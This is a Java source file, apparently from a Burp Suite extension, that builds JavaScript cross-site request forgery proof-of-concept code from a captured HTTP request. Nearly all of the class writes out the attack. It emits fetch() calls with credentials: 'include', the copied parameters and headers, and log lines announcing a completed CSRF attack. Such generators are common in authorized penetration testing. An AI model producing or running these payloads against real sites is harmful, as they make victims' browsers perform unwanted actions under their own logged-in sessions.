package com.curiosidadesdehackers.burp;

import java.util.Map;

public class GeneradorJsPoc {
    public String generar(AnalizadorPeticion analizador) {
        StringBuilder jsPoc = new StringBuilder();

        jsPoc.append("// Generado por CSRF POC Avanzado de Curiosidades De Hackers\n");
        jsPoc.append("// POC CSRF con JavaScript\n");
        jsPoc.append("const url = '").append(analizador.getUrl()).append("';\n\n");

        if (analizador.getMetodo().equalsIgnoreCase("GET")) {
            // Para GET, añadir parámetros a la URL
            StringBuilder queryParams = new StringBuilder();
            for (Map.Entry<String, String> entry : analizador.getParametros().entrySet()) {
                if (queryParams.length() > 0) queryParams.append("&");
                queryParams.append(entry.getKey()).append("=").append(entry.getValue());
            }

            jsPoc.append("const fullUrl = url + (url.includes('?') ? '&' : '?') + '").append(queryParams.toString()).append("';\n");
            jsPoc.append("fetch(fullUrl, {\n");
            jsPoc.append("  method: 'GET',\n");
            jsPoc.append("  credentials: 'include',\n");
            jsPoc.append("  headers: {\n");

            // Añadir cabeceras relevantes
            for (Map.Entry<String, String> entry : analizador.getCabeceras().entrySet()) {
                if (!entry.getKey().equalsIgnoreCase("Content-Length") &&
                    !entry.getKey().equalsIgnoreCase("Host")) {
                    jsPoc.append("    '").append(entry.getKey()).append("': '").append(entry.getValue()).append("',\n");
                }
            }

            jsPoc.append("  }\n");
            jsPoc.append("}).then(response => {\n");
            jsPoc.append("  console.log('Ataque CSRF completado');\n");
            jsPoc.append("}).catch(error => {\n");
            jsPoc.append("  console.error('Error en el ataque CSRF:', error);\n");
            jsPoc.append("});");
        } else {
            // Para POST, PUT, etc.
            jsPoc.append("const formData = new FormData();\n");

            for (Map.Entry<String, String> entry : analizador.getParametros().entrySet()) {
                jsPoc.append("formData.append('").append(entry.getKey()).append("', '")
                     .append(entry.getValue().replace("'", "\\'")).append("');\n");
            }

            jsPoc.append("\nfetch(url, {\n");
            jsPoc.append("  method: '").append(analizador.getMetodo()).append("',\n");
            jsPoc.append("  body: formData,\n");
            jsPoc.append("  credentials: 'include',\n");
            jsPoc.append("  headers: {\n");

            // Añadir cabeceras relevantes
            for (Map.Entry<String, String> entry : analizador.getCabeceras().entrySet()) {
                if (!entry.getKey().equalsIgnoreCase("Content-Length") &&
                    !entry.getKey().equalsIgnoreCase("Host")) {
                    jsPoc.append("    '").append(entry.getKey()).append("': '").append(entry.getValue()).append("',\n");
                }
            }

            jsPoc.append("  }\n");
            jsPoc.append("}).then(response => {\n");
            jsPoc.append("  console.log('Ataque CSRF completado');\n");
            jsPoc.append("}).catch(error => {\n");
            jsPoc.append("  console.error('Error en el ataque CSRF:', error);\n");
            jsPoc.append("});");
        }

        return jsPoc.toString();
    }
}
